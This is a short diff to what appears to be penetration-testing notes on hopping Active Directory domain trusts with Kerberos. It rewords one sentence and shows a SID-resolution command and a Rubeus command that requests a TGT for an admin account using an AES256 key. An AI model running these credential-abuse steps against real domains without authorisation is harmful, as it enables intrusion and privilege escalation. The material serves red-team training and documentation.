@@ -34,7 +34,7 @@ The `MemberName` field contains a SID that can be resolved in our current domain
 ConvertFrom-SID  S-1-5-21-3263068140-2042693922-2891547269-1132
 ```
 
-To hop a domain trust using Kerberos, we first need an inter-realm Key. We can obtain a TGT for the target user.
+To hop a domain trust using Kerberos, we first need an inter-realm Key. We need a TGT for the target user.
 
 ```
 .\Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:<aes256> /nowrap
